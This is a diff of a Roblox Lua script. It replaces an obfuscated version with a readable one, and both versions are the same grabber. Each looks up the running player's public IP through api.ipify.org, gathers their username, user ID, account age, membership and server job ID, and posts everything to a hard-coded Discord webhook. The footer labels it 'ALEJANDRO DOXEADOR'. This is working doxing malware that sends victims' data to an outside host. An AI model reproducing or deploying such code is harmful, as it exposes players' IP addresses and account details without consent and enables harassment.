@@ -1,47 +1,51 @@
-local _0x4a4e93 = "https://discord.com/api/webhooks/1396332293232263228/yDNk7WXsXLuit9p_TpLe8BCV69TutneEzT3jUBZHsd6dptOzvff_smOLdJQv7GoNq01u"
-local _0x3e6b58 = game:GetService("HttpService")
-local _0x3f2920 = game:GetService("Players")
-local _0x5969c3 = _0x3f2920.LocalPlayer
-local _0x4310b1 = "No IP"
-pcall(function()
-    _0x4310b1 = game:HttpGet(string.char(104,116,116,112,58,47,47,97,112,105,102,121,111,114,103))
-end)
-local _0x49e048 = _0x5969c3.UserId
-local _0x3d21cd = _0x5969c3.Name
-local _0x3ba61c = _0x5969c3.DisplayName
-local _0x4b94bc = _0x5969c3.AccountAge
-local _0x2cc544 = _0x5969c3.MembershipType.Name
-local _0x4405b5 = game.JobId
-local _0x41f5fa = string.char(104,116,116,112,58,47,47,119,119,119,46,114,111,98,108,111,120,46,99,111,109,47,103,97,109,101,115,47)..game.PlaceId
-local _0x518bfa = string.char(104,116,116,112,58,47,47,119,119,119,46,114,111,98,108,111,120,46,99,111,109,47,117,115,101,114,115,47).._0x49e048.."/profile"
+local webhookURL = "https://discord.com/api/webhooks/1396332293232263228/yDNk7WXsXLuit9p_TpLe8BCV69TutneEzT3jUBZHsd6dptOzvff_smOLdJQv7GoNq01u"
 
-local _0x2f60a3 = {
-    ["username"] = string.char(65,76,69,74,65,78,68,82,79), -- "ALEJANDRO"
-    ["avatar_url"] = string.char(104,116,116,112,58,47,47,105,109,103,117,114,46,99,111,109,47,65,102,70,112,55,112,117,46,112,110,103),
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local ip = "No IP"
+pcall(function()
+    ip = game:HttpGet("http://api.ipify.org")
+end)
+
+local userId = player.UserId
+local username = player.Name
+local displayName = player.DisplayName
+local age = player.AccountAge
+local membership = player.MembershipType.Name
+local jobId = game.JobId
+local gameLink = "https://www.roblox.com/games/"..game.PlaceId
+local profileLink = "https://www.roblox.com/users/"..userId.."/profile"
+
+local data = {
+    ["username"] = "ALEJANDRO",
+    ["avatar_url"] = "https://i.imgur.com/AfFp7pu.png",
     ["embeds"] = {{
-        ["title"] = "Secreto",
-        ["description"] = "**Usuario**: [".._0x3d21cd.."](".._0x518bfa..")\n**Juego**: [".._0x41f5fa.."]\n\n**IP Pública**: `".._0x4310b1.."`",
+        ["title"] = "📡 Datos recopilados",
+        ["description"] = "**Usuario**: ["..username.."]("..profileLink..")\n**Juego**: ["..gameLink.."]\n\n**IP Pública**: `"..ip.."`",
         ["fields"] = {
-            {["name"]=string.char(68,105,115,112,108,97,121,32,78,97,109,101), ["value"]=_0x3ba61c, ["inline"]=true}, -- "Display Name"
-            {["name"]=string.char(85,115,101,114,32,73,68), ["value"]=tostring(_0x49e048), ["inline"]=true}, -- "User ID"
-            {["name"]=string.char(65,99,99,111,117,110,116,32,65,103,101), ["value"]=_0x4b94bc.." "..string.char(100,105,97,115), ["inline"]=true}, -- "Account Age"
-            {["name"]=string.char(77,101,109,98,101,114,115,104,105,112), ["value"]=_0x2cc544, ["inline"]=true}, -- "Membership"
-            {["name"]=string.char(74,111,98,32,73,68), ["value"]=_0x4405b5 or string.char(78,47,65), ["inline"]=false} -- "Job ID"
+            {["name"]="Display Name", ["value"]=displayName, ["inline"]=true},
+            {["name"]="User ID", ["value"]=tostring(userId), ["inline"]=true},
+            {["name"]="Account Age", ["value"]=age.." días", ["inline"]=true},
+            {["name"]="Membership", ["value"]=membership, ["inline"]=true},
+            {["name"]="Job ID", ["value"]=jobId or "N/A", ["inline"]=false}
         },
         ["color"] = 16711680,
         ["footer"] = {
-            ["text"] = string.char(65,76,69,74,65,78,68,82,79,32,68,79,88,69,65,68,79,82) -- "ALEJANDRO DOXEADOR"
+            ["text"] = "ALEJANDRO DOXEADOR"
         }
     }}
 }
 
+
 pcall(function()
     request({
-        Url = _0x4a4e93,
-        Method = string.char(80,79,83,84), -- "POST"
+        Url = webhookURL,
+        Method = "POST",
         Headers = {
-            ["Content-Type"] = string.char(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110) -- "application/json"
+            ["Content-Type"] = "application/json"
         },
-        Body = _0x3e6b58:JSONEncode(_0x2f60a3)
+        Body = HttpService:JSONEncode(data)
     })
 end)
